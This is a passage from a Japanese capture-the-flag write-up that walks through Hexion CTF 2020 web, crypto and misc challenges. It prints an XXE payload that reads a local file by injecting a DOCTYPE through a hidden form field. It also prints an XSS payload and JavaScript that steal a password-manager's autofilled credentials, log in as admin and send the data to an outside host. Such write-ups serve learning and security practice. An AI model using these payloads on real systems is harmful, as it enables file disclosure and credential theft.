`/admin_pass` にパスワードがあるようです。`/admin_pass` にアクセスしても 404 が返ってくるだけなので、ファイルシステム上の `/admin_pass` のことを言っているのでしょう。

ここで思い出されるのは XXE (XML External Entity) を使った攻撃です。ただ、XML では DOCTYPE 宣言は先頭に配置する必要があるため、このままでは厳しいものがあります。

ユーザ名の他に操作できるパラメータがないか探していると、最初の入力フォームに気になるものがありました。

```html
        <form class="centered" action="login" method="post">
            <div style="text-align: center;"><h4>Just Another</h4><h1>Cookie Clicker</h1></div>
            <input class="good" name="username" placeholder="Username" />
            <input name="version" value="1.0.0" hidden>
            <button class="good" type="submit">Play</button>
        </form>
```

`version` という隠されたパラメータがあります。XML の最初の方には `<!-- API Version: 1.0.0 -->` というコメントがありますが、おそらくここに挿入されるのでしょう。

試しに `1.0.0` ではなく `-->poyo<!--` が送信されるようにしてみると、`Error: Start tag expected, '<' not found, line 1, column 22 (, line 1)` というエラーが表示されました。これなら DOCTYPE 宣言を仕込むことができそうです。

`<input name="version" value="1.0.0" hidden>` を `<textarea name="version"></textarea>` に変えて、ユーザ名に `&xxe;` を、この `textarea` に

```
-->
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///admin_pass">
]>
<!--
```

を入力します。

![xxe](../images/2020-04-13_jacc4.png)

このまま送信すると、`Good Luck gLTAqe12Z3OufWG7!` と表示されました。やった!

先程と同じ手順で admin 用のログインフォームを表示させ、`gLTAqe12Z3OufWG7` を入力するとフラグが表示されました。

```
hexCTF{th3_c00ki3_m0nst3r_at3_my_c00ki3s}
```

## [Web 990] Password Manager (12 solves)
> We have Intel about the owner of this website:  
> He's using a Password Manager!
> 
> Can you use this Intel to steal his credentials?  
> A flag will wait for you right after you log in.
> 
> (URL)
> 
> Author: Yarin
> 
> Hint: This is a password manager browser extension.  
> What do password manager extensions do?

与えられた URL にアクセスすると、以下のようなログインフォームが表示されました。

![ログインフォーム](../images/2020-04-13_pm1.png)

適当なユーザ名とパスワードを入力するとログインでき、以下のような画面が表示されました。

![機能が充実している](../images/2020-04-13_pm2.png)

URL の報告だけができるようです。とりあえず [Webhook.site](https://webhook.site/) で URL を生成して投げると、`Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0` という User-Agent のブラウザからアクセスが来ました。

バージョンはちょっと古いですが、[CONFidence CTF 2020 Teaser の Cat Web](2020-03-15-confidence-2020-ctf.html#web-157-cat-web-24-solves) のように使えそうな脆弱性は見つかりません。この Web アプリケーション内に脆弱性がないか探してみましょう。

ログアウトしてみると `/login?next=` にリダイレクトされました。この `next` という GET パラメータはどこに使われるのでしょう。`/login?next=abc%20<>"%27` にアクセスすると以下のような HTML が返ってきました。

```html
            <form method="post" action=abc &lt;&gt;&#34;&#39;>
                <input name="username" id="sfrusername" type="text" placeholder="Username"/>
                <br>
                <input name="password" id="sfrpassword" type="password" placeholder="Password" />
                <br>
                <button class="good" type="submit">Login</button>
            </form>
```

`<` や `>` といった特殊な文字はエスケープされていますが、`form` の属性で XSS ができそうな雰囲気があります。

ヒントによればパスワードマネージャの拡張機能を使っているようですから、このフォームのユーザ名とパスワードに自動でなにか入力されるのでしょう。`form` の属性で使えそうなものを調べていると、[`oninput`](https://developer.mozilla.org/ja/docs/Web/API/GlobalEventHandlers/oninput) というイベントハンドラが見つかりました。

`(new Image).src='http://(省略)?'+document.getElementById('sfrpassword').value` を Base64 エンコードした上で

```
http://(省略)/login?next=a%20oninput=eval(atob(`(Base64 エンコードした JavaScript コード)`))
```

という URL を投げると、JavaScript コード中で指定した URL にパスワードが飛んできました…が、これをログインフォームで `admin` のパスワードとして入力してもログインに失敗します。

もう一度 URL を送信するとまた別のパスワードが飛んできました。URL の送信ごとにパスワードをリセットしているのでしょうか。

パスワードの抽出だけでなく、admin にログインとフラグの送信までさせるように変えてみましょう。

```javascript
var username = document.getElementById('sfrusername').value;
var password = document.getElementById('sfrpassword').value;
var formData = new FormData();
formData.append('username', username);
formData.append('password', password);
if (password.length == 16) {
  fetch('/login', {
    method: 'POST',
    body: formData
  }).then(resp => resp.text()).then(resp => {
    (new Image).src='http://(省略)?' + resp;
  });
}
```

admin にこの JavaScript コードを実行させると、フラグを手に入れることができました。

```
hexCTF{pa55w0rd_m4nag3rs_c4n_hav3_vuln3rabilit1es_t00}
```

## [Crypto 136] X0R (99 solves)
> XOR is best method for OTPs, especially for flags.
> 
> Author: Yarin
> 
> 添付ファイル: x0r.zip

`x0r.zip` を展開すると `enc.py` と `flag.enc` という 2 つのファイルが出てきました。`flag.enc` は `enc.py` の出力結果でしょう。`enc.py` は以下のような内容でした。

```python
from random import choice, randint
from string import ascii_letters
from itertools import cycle

key = ''.join([choice(ascii_letters) for i in range(randint(8, 16))])

with open("flag.txt", "r") as file:
    flag = file.read()

key_gen = cycle(key)
data = []
for i in range(len(flag)):
    data.append(chr(ord(flag[i]) ^ ord(next(key_gen))))

with open("flag.enc", "w+") as file:
    file.write(''.join(data))
```

8 文字以上 16 文字以下の鍵を生成した上で、フラグと XOR して出力するようです。`hexCTF{` というフラグフォーマットを利用して鍵を推測してみましょう。

```
>>> from pwn import *
>>> s = open('flag.enc', 'rb').read()
>>> xor(s, 'hexCTF{')
'JtmZzCJpWBRK\x7f`GFuv\x7fU\x7f^vH}VbTdxKX{et@LeA{OE'
>>> 
```

鍵は `JtmZzCJ` から始まるようです。

```
>>> xor(s, 'JtmZzCJ')
'hexCTF{RFWKezQeW`oQPN|g]dxgeFi^AU`Eb]pXUJt'
>>> xor(s, 'JtmZzCJ?')
"hexCTF{'xN|ECXe\x1cGAFI~uY\x0ftvIuv^y$eWbrS^H\x10CJ"
>>> xor(s, 'JtmZzCJ??')
"hexCTF{'\rpercali2\nagilist=\x1bexpiali0\x17cious}"
```

英単語の一部がいくつか見え、また `}` で終わっていることから鍵は 9 文字であると推測できます。`'\rper` はたぶん `super` でしょうから、そうなるように鍵を修正します。

```
>>> xor("'\r", '??', 'su')
'kG'
>>> xor(s, 'JtmZzCJkG')
'hexCTF{supercalifragilisticexpialidocious}'
```

フラグが得られました。

```
hexCTF{supercalifragilisticexpialidocious}
```

## [Misc 50] About (383 solves)
> Please read the rules :)

[この CTF の紹介ページ](https://ctf.hexionteam.com/about)に、`For example: hexCTF{mu5t_b3_7he_eas1est_fl4g_y0u_g0t}` とフラグの例として挙げる形でフラグが書かれていました。

```
hexCTF{mu5t_b3_7he_eas1est_fl4g_y0u_g0t}
```

---

> **Prizes**  
> 1st Place - Virtual kisses.  
> 2nd Place - Virtual hugs.  
> 3rd Place - Virtual handshakes.

1 位の賞品は Virtual kisses らしいです。

## [Misc 100] Mirage (215 solves)
> "Your eyes can deceive you; don't trust them."  
> -- Obi-Wan Kenobi
> 
> (URL)
> 
> Author: Idan

与えられた URL にアクセスすると、以下のような謎の文字列と文字列の入力フォームが表示されました。

![謎フォント1](../images/2020-04-13_mirage1.png)

`j4teqybvAskIE2S}4IdIc_M5IB8IHmlIF_0Ypn` はフラグを意味しているのでしょうが、フラグフォーマットは `hexCTF\{[^\x00-\x1F\x80-\x9F]+\}` なのでこのまま提出してもダメでしょう。

試しに `012ABCabc` を入力してみると、以下のように表示されました。

![謎フォント2](../images/2020-04-13_mirage2.png)

HTML には `script` 要素などは見当たらず、JavaScript で置換されているわけではなく独自フォントでシャッフルされているだけとわかります。

ASCII 範囲内の printable な文字を全部入力して、それぞれどの文字に置換されるかというテーブルを作った上で、フラグをデコードするスクリプトを書きましょう。

```python
table = {v: k for k, v in zip('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~', '_HLYUaPkr6dBFS4f}jZE5gRsAKOplm20xt8hwcevoyGz1TJ{VDMQ39iquC7WXN!"#$%&\'()*+,-./:;<=>?@[\\]^I`b|n~')}
print(''.join(table[c] for c in 'j4teqybvAskIE2S}4IdIc_M5IB8IHmlIF_0Ypn'))
```

```
$ python3 solve.py
hexCTF{Don7_judge_a_B0Ok_by_1ts_c0v3r}
```

フラグが得られました。

```
hexCTF{Don7_judge_a_B0Ok_by_1ts_c0v3r}
```

## [Misc 453] Hmmm (79 solves)
> 🤔
> 
> Author: moka
> 
> Note: anime girl isn't the flag
> 
> 添付ファイル: hmmm (ELF ファイル)

実行してみましょう。

```
$ ./hmmm 
⢸⣿⣿⣿⣿⠃⠄⢀⣴⡾⠃⠄⠄⠄⠄⠄⠈⠺⠟⠛⠛⠛⠛⠻⢿⣿⣿⣿⣿⣶⣤⡀⠄
⢸⣿⣿⣿⡟⢀⣴⣿⡿⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣸⣿⣿⣿⣿⣿⣿⣿⣷
⢸⣿⣿⠟⣴⣿⡿⡟⡼⢹⣷⢲⡶⣖⣾⣶⢄⠄⠄⠄⠄⠄⢀⣼⣿⢿⣿⣿⣿⣿⣿⣿⣿
⢸⣿⢫⣾⣿⡟⣾⡸⢠⡿⢳⡿⠍⣼⣿⢏⣿⣷⢄⡀⠄⢠⣾⢻⣿⣸⣿⣿⣿⣿⣿⣿⣿
⡿⣡⣿⣿⡟⡼⡁⠁⣰⠂⡾⠉⢨⣿⠃⣿⡿⠍⣾⣟⢤⣿⢇⣿⢇⣿⣿⢿⣿⣿⣿⣿⣿
⣱⣿⣿⡟⡐⣰⣧⡷⣿⣴⣧⣤⣼⣯⢸⡿⠁⣰⠟⢀⣼⠏⣲⠏⢸⣿⡟⣿⣿⣿⣿⣿⣿
⣿⣿⡟⠁⠄⠟⣁⠄⢡⣿⣿⣿⣿⣿⣿⣦⣼⢟⢀⡼⠃⡹⠃⡀⢸⡿⢸⣿⣿⣿⣿⣿⡟
⣿⣿⠃⠄⢀⣾⠋⠓⢰⣿⣿⣿⣿⣿⣿⠿⣿⣿⣾⣅⢔⣕⡇⡇⡼⢁⣿⣿⣿⣿⣿⣿⢣
⣿⡟⠄⠄⣾⣇⠷⣢⣿⣿⣿⣿⣿⣿⣿⣭⣀⡈⠙⢿⣿⣿⡇⡧⢁⣾⣿⣿⣿⣿⣿⢏⣾
⣿⡇⠄⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢻⠇⠄⠄⢿⣿⡇⢡⣾⣿⣿⣿⣿⣿⣏⣼⣿
⣿⣷⢰⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⢰⣧⣀⡄⢀⠘⡿⣰⣿⣿⣿⣿⣿⣿⠟⣼⣿⣿
⢹⣿⢸⣿⣿⠟⠻⢿⣿⣿⣿⣿⣿⣿⣿⣶⣭⣉⣤⣿⢈⣼⣿⣿⣿⣿⣿⣿⠏⣾⣹⣿⣿
⢸⠇⡜⣿⡟⠄⠄⠄⠈⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟⣱⣻⣿⣿⣿⣿⣿⠟⠁⢳⠃⣿⣿⣿
⠄⣰⡗⠹⣿⣄⠄⠄⠄⢀⣿⣿⣿⣿⣿⣿⠟⣅⣥⣿⣿⣿⣿⠿⠋⠄⠄⣾⡌⢠⣿⡿⠃
⠜⠋⢠⣷⢻⣿⣿⣶⣾⣿⣿⣿⣿⠿⣛⣥⣾⣿⠿⠟⠛⠉⠄⠄
```

藤原書記でしょうか。とりあえず Ghidra で開いてエントリーポイントや `.init_array` などを見てみましたが、気になる処理はありません。

困ってバイナリエディタで開いて眺めていると、0x380 あたりにフラグっぽいものを見つけました。

![nanikore](../images/2020-04-13_hmmm.png)

`re.findall(rb'hexCTF\{.+?\}',open('hmmm','rb').read().replace(b'\0',b''))[0]` を実行するとフラグが得られました。

```
hexCTF{1m_s0rry_1f_y0u_r3v3r5ed_7h1s}
```